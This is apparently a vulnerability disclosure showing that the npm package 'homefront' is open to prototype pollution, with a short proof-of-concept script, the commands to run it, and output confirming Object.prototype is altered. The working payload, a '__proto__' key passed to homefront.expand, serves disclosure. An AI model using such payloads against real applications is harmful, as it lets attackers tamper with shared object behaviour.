# Description

`homefront` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var homefront = require("homefront")
console.log("Before : " + {}.polluted);
homefront.expand({"__proto__.polluted": "Yes! Its Polluted"})
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i homefront # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
